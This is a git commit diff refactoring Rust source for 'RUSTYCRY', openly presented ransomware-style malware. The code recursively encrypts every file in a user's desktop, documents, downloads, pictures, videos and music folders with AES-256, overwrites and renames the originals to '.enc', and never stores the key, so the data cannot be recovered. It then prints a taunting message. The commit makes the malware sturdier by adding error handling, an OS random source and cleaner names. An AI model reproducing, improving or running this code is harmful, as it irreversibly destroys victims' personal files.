8900f037244c314a5a38dce7394bc9d2fc8894d3
Tanmay patil <66236112+tanm-sys@users.noreply.github.com>
2024-09-10 10:31:02 +0530

    Update main.rs

--- main.rs
+++ main.rs
@@ -2,17 +2,17 @@ use aes::Aes256;
 use block_modes::{BlockMode, Cbc};
 use block_modes::block_padding::Pkcs7;
 use walkdir::WalkDir;
-use rand::{Rng, thread_rng};
-use rand::distributions::Standard;
+use rand::rngs::OsRng;
+use rand::RngCore;
 use std::fs::{self, File};
-use std::io::{Read, Write};
+use std::io::{self, Read, Write};
 use std::path::PathBuf;
-use std::convert::TryInto;
 use dirs::{desktop_dir, document_dir, download_dir, picture_dir, video_dir, audio_dir};
+
 type EncCbc = Cbc<Aes256, Pkcs7>;
 
-fn entrypt() {
-    let (key, iv) = keyiv();
+fn encrypt() {
+    let (key, iv) = key_iv();
     let common_dirs = vec![
         desktop_dir(),
         document_dir(),
@@ -21,71 +21,83 @@ fn entrypt() {
         video_dir(),
         audio_dir(),
     ];
+    
     for dir in common_dirs {
         if let Some(path) = dir {
-            stomp(key, iv, path);
+            if let Err(e) = stomp(key, iv, path) {
+                eprintln!("Failed to process directory {:?}: {}", path, e);
+            }
         }
     }
+
     for _ in 0..100 {
         println!("REST IN PEACE: YOUR FILE SYSTEM - YOURS FAITHFULLY, RUSTYCRY");
     }
+
     println!("\nPress Enter to exit...");
     let mut input = String::new();
-    std::io::stdin().read_line(&mut input).unwrap();
+    if let Err(e) = std::io::stdin().read_line(&mut input) {
+        eprintln!("Failed to read user input: {}", e);
+    }
 }
-fn keyiv() -> ([u8; 32], [u8; 16]) {
-    let generate_iv: fn() -> ([u8; 32], [u8; 16]) = genkeyiv;
-    generate_iv()
+
+fn key_iv() -> ([u8; 32], [u8; 16]) {
+    gen_key_iv()
 }
-fn genkeyiv() -> ([u8; 32], [u8; 16]) {
-    let rng = thread_rng();
-    let key: [u8; 32] = rng.sample_iter(&Standard).take(32).collect::<Vec<u8>>().try_into().unwrap();
-    let iv: [u8; 16] = thread_rng().sample_iter(&Standard).take(16).collect::<Vec<u8>>().try_into().unwrap();
+
+fn gen_key_iv() -> ([u8; 32], [u8; 16]) {
+    let mut key = [0u8; 32];
+    let mut iv = [0u8; 16];
+    let mut rng = OsRng;
+
+    rng.fill_bytes(&mut key);
+    rng.fill_bytes(&mut iv);
+
     (key, iv)
 }
-fn stomp(key: [u8; 32], iv: [u8; 16], start_dir: PathBuf) {
+
+fn stomp(key: [u8; 32], iv: [u8; 16], start_dir: PathBuf) -> io::Result<()> {
     for entry in WalkDir::new(start_dir) {
-        let entry = entry.unwrap();
+        let entry = entry?;
         if entry.file_type().is_file() {
             let path = entry.path().to_path_buf();
-            encf(&path, &key, &iv);
+            if let Err(e) = encrypt_file(&path, &key, &iv) {
+                eprintln!("Failed to encrypt {:?}: {}", path, e);
+            }
         }
     }
-}
-fn encf(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) {
-    let obscure_function: fn(&PathBuf, &[u8; 32], &[u8; 16]) = encf2;
-    obscure_function(path, key, iv)
-}
-fn encf2(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) {
-    match try_encf2(path, key, iv) {
-        Ok(_) => println!("Successfully encrypted: {:?}", path),
-        Err(e) => println!("Failed to encrypt {:?}: {}", path, e),
-    }
-}
-fn try_encf2(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> std::io::Result<()> {
-    let content = readcon(path)?;
-    let cipher = EncCbc::new_from_slices(key, iv).unwrap();
-    let encrypted_data = cipher.encrypt_vec(&content);
-    writecon(path, &encrypted_data)?;
-    renamef(path)?;
     Ok(())
 }
-fn readcon(path: &PathBuf) -> std::io::Result<Vec<u8>> {
-    let mut file = File::open(&path)?;
+
+fn encrypt_file(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> io::Result<()> {
+    let content = read_content(path)?;
+    let cipher = EncCbc::new_from_slices(key, iv)?;
+    let encrypted_data = cipher.encrypt_vec(&content);
+    write_content(path, &encrypted_data)?;
+    rename_file(path)?;
+    println!("Successfully encrypted: {:?}", path);
+    Ok(())
+}
+
+fn read_content(path: &PathBuf) -> io::Result<Vec<u8>> {
+    let mut file = File::open(path)?;
     let mut content = Vec::new();
     file.read_to_end(&mut content)?;
     Ok(content)
 }
-fn writecon(path: &PathBuf, content: &[u8]) -> std::io::Result<()> {
-    let mut file = File::create(&path)?;
+
+fn write_content(path: &PathBuf, content: &[u8]) -> io::Result<()> {
+    let mut file = File::create(path)?;
     file.write_all(content)?;
     Ok(())
 }
-fn renamef(path: &PathBuf) -> std::io::Result<()> {
+
+fn rename_file(path: &PathBuf) -> io::Result<()> {
     let new_name = format!("{}.enc", path.to_str().unwrap());
     fs::rename(path, new_name)?;
     Ok(())
 }
+
 fn main() {
-    entrypt();
+    encrypt();
 }
